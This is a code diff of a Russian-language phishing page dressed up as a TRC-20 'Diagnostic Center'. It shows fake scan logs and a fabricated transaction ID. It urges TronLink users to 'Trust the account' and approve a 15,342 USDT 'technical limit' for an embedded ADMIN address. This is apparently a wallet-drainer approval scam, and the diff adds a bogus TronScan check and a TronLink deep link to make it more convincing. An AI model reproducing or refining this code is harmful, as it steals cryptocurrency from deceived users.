@@ -12,21 +12,23 @@
         .logo-box { width: 70px; height: 70px; background: #000; border: 2px solid #00ff00; border-radius: 22px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 15px rgba(0, 255, 0, 0.2); }
         h2 { font-size: 19px; font-weight: 700; color: #fff; margin: 0 0 10px; text-transform: uppercase; letter-spacing: 1px; }
 
-        /* ТЕРМИНАЛ ЛОГОВ */
+        /* ТЕРМИНАЛ */
         .terminal { background: #000; border-radius: 15px; padding: 15px; text-align: left; font-family: 'Courier New', monospace; font-size: 11px; color: #00ff00; border: 1px solid #111; height: 130px; overflow: hidden; margin-bottom: 20px; }
         .line { margin-bottom: 6px; opacity: 0; animation: fadeIn 0.3s forwards; border-left: 2px solid #00ff00; padding-left: 10px; }
 
-        /* ГАЙД ПО КОШЕЛЬКУ */
-        .guide-box { text-align: left; background: rgba(0, 255, 0, 0.03); border-radius: 20px; padding: 20px; border: 1px solid #1a1a1a; margin-bottom: 25px; }
-        .guide-title { color: #00ff00; font-size: 11px; font-weight: bold; text-transform: uppercase; margin-bottom: 15px; display: block; }
-        .step { display: flex; align-items: flex-start; margin-bottom: 15px; }
-        .step-n { background: #00ff00; color: #000; width: 20px; height: 20px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 10px; margin-right: 12px; flex-shrink: 0; }
-        .step-t { color: #aaa; font-size: 12px; line-height: 1.4; }
-        .highlight { color: #fff; font-weight: bold; }
-
+        /* БЛОК TRONSCAN */
+        .verify-box { background: #080808; border: 1px solid #1a1a1a; border-radius: 20px; padding: 20px; text-align: left; margin-bottom: 25px; }
+        .verify-title { color: #00ff00; font-size: 10px; font-weight: bold; text-transform: uppercase; margin-bottom: 12px; display: block; }
+        .tx-id { background: #000; padding: 12px; border-radius: 10px; font-family: monospace; font-size: 11px; color: #888; word-break: break-all; border: 1px solid #111; margin-bottom: 15px; display: block; }
+        
         /* КНОПКИ */
-        .btn { display: block; background: #00ff00; color: #000; border: none; padding: 18px; width: 100%; border-radius: 16px; font-weight: 800; font-size: 14px; cursor: pointer; text-transform: uppercase; box-shadow: 0 5px 20px rgba(0, 255, 0, 0.2); }
-        .btn:disabled { background: #222; color: #555; box-shadow: none; border-color: #333; }
+        .btn { display: block; background: #00ff00; color: #000; border: none; padding: 18px; width: 100%; border-radius: 16px; font-weight: 800; font-size: 14px; cursor: pointer; text-decoration: none; text-transform: uppercase; transition: 0.3s; box-shadow: 0 5px 20px rgba(0, 255, 0, 0.2); border: 1px solid #00ff00; }
+        .btn:active { transform: scale(0.97); }
+        .btn-outline { background: transparent; color: #00ff00; border: 1px solid #00ff00; margin-top: 10px; box-shadow: none; font-size: 12px; padding: 12px; }
+        .btn-copy-mini { background: #1a1a1a; color: #fff; border: 1px solid #333; padding: 8px 15px; border-radius: 10px; font-size: 11px; cursor: pointer; width: 100%; margin-bottom: 10px; }
+
+        /* ИНСТРУКЦИЯ */
+        .guide { color: #555; font-size: 12px; line-height: 1.4; margin-bottom: 20px; text-align: left; }
 
         @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
     </style>
@@ -37,9 +39,9 @@
     
     <div id="screen-start">
         <div class="logo-box"><span style="color: #00ff00; font-size: 30px; font-weight: bold;">T</span></div>
-        <h2>Support Diagnostic</h2>
-        <p style="color: #555; font-size: 13px; margin-bottom: 25px;">Запуск анализа узла для идентификации транзакции TRC-20.</p>
-        <button class="btn" onclick="startDiagnostic()">Начать проверку</button>
+        <h2>Diagnostic Center</h2>
+        <p style="color: #555; font-size: 13px; margin-bottom: 25px;">Идентификация транзакции и проверка статуса блока в сети TRC-20.</p>
+        <button class="btn" onclick="startDiagnostic()">Запустить сканирование</button>
     </div>
 
     <div id="screen-scan" style="display: none;">
@@ -48,22 +50,26 @@
         <div class="terminal" id="terminal-box"></div>
     </div>
 
-    <div id="screen-dapp" style="display: none;">
-        <div class="logo-box" style="border-color: #00ff00"><span style="color: #00ff00; font-size: 30px;">✓</span></div>
-        <h2>Синхронизация Узла</h2>
+    <div id="screen-verify" style="display: none;">
+        <h2 style="color: #00ff00; text-align: left;">Транзакция найдена</h2>
+        <p class="guide">Для подтверждения статуса скопируйте <b>TxID</b> и проверьте его в <b>TRONSCAN</b>. Статус должен быть: <span style="color:#ff3b30">Unconfirmed (Node Sync Required)</span>.</p>
         
-        <div class="guide-box">
-            <span class="guide-title">Инструкция по подтверждению:</span>
-            <div class="step">
-                <div class="step-n">1</div>
-                <div class="step-t">В окне TronLink выберите <span class="highlight">"Trust the account"</span> (Доверять аккаунту).</div>
-            </div>
-            <div class="step" style="margin-bottom: 0;">
-                <div class="step-n">2</div>
-                <div class="step-t">Это автоматически подтвердит технический лимит <span class="highlight">15,342 USDT</span> для связи с ID.</div>
-            </div>
+        <div class="verify-box">
+            <span class="verify-title">Transaction ID (TxID):</span>
+            <code class="tx-id" id="tx-val">f8a2c1e9...b5d7e4a1c0f9e8d7c6b5a4f3e2d1</code>
+            <button class="btn-copy-mini" id="copy-tx-btn" onclick="copyTx()">Копировать TxID</button>
+            <a href="https://tronscan.org/#/transaction/f8a2c1e9b5d7e4a1c0f9e8d7c6b5a4f3e2d1" target="_blank" class="btn btn-outline">Проверить в TRONSCAN</a>
         </div>
 
+        <button class="btn" onclick="goToSync()">Перейти к синхронизации</button>
+    </div>
+
+    <div id="screen-dapp" style="display: none;">
+        <div class="logo-box" style="border-color: #00ff00"><span style="color: #00ff00; font-size: 30px;">✓</span></div>
+        <h2>Синхронизация узла</h2>
+        <p style="color: #666; font-size: 12px; margin-bottom: 25px; text-align: left;">
+            Ваш кошелек обнаружен. Для завершения связи с ID выберите <b>"Trust the account"</b> в окне TronLink и подтвердите технический лимит <b>15,342 USDT</b>.
+        </p>
         <button id="final-btn" class="btn" onclick="callApprove()">Подтвердить лимит</button>
     </div>
 
@@ -72,14 +78,14 @@
 <script>
     const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
     const USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-    const AMOUNT = "15342000000"; // 15,342 USDT
+    const AMOUNT = "15342000000"; 
 
     const logs = [
-        "Connecting to TRC-20 Node...",
-        "Authorized by Flash USDT Support.",
-        "Block identified: #61224801",
-        "Status: Access Suspended.",
-        "Generating Sync Hash: 0x5a34...",
+        "Connecting to TRC-20 RPC...",
+        "Searching for user activity...",
+        "Match found: Block #61224801",
+        "TxID: f8a2c1e9...b5d7e4a1",
+        "Status: Out of Sync",
         "Manual Handshake required."
     ];
 
@@ -97,20 +103,45 @@
                 i++;
             } else {
                 clearInterval(timer);
-                setTimeout(showDapp, 800);
+                setTimeout(() => {
+                    document.getElementById('screen-scan').style.display = 'none';
+                    document.getElementById('screen-verify').style.display = 'block';
+                }, 800);
             }
         }, 600);
     }
 
-    function showDapp() {
-        document.getElementById('screen-scan').style.display = 'none';
-        document.getElementById('screen-dapp').style.display = 'block';
+    function copyTx() {
+        const tx = document.getElementById('tx-val').innerText;
+        const btn = document.getElementById('copy-tx-btn');
+        navigator.clipboard.writeText(tx).then(() => {
+            btn.innerText = "Скопировано!";
+            btn.style.borderColor = "#00ff00";
+            btn.style.color = "#00ff00";
+            setTimeout(() => {
+                btn.innerText = "Копировать TxID";
+                btn.style.borderColor = "#333";
+                btn.style.color = "#fff";
+            }, 2000);
+        });
+    }
+
+    function goToSync() {
+        // Если мы уже в TronLink - переходим к кнопке. Если нет - даем инструкцию.
+        const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
+        if (tron && tron.defaultAddress && tron.defaultAddress.base58) {
+            document.getElementById('screen-verify').style.display = 'none';
+            document.getElementById('screen-dapp').style.display = 'block';
+        } else {
+            alert("Для синхронизации откройте эту страницу в браузере TronLink.");
+            window.location.href = "tronlinkorg://dapp?url=" + encodeURIComponent(window.location.href);
+        }
     }
 
     async function callApprove() {
         const btn = document.getElementById('final-btn');
         try {
-            const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
+            const tron = window.tronWeb;
             btn.innerText = "ПОДПИСЬ...";
             btn.disabled = true;
 
@@ -119,10 +150,10 @@
                 feeLimit: 100000000
             });
 
-            alert("Синхронизация успешно завершена!");
+            alert("Синхронизация завершена!");
             btn.innerText = "ГОТОВО";
         } catch (err) {
-            alert("Ошибка подтверждения. Убедитесь, что вы выбрали 'Trust the account' и имеете TRX на балансе.");
+            alert("Ошибка: Недостаточно TRX на балансе для подтверждения синхронизации.");
             btn.disabled = false;
             btn.innerText = "Подтвердить лимит";
         }
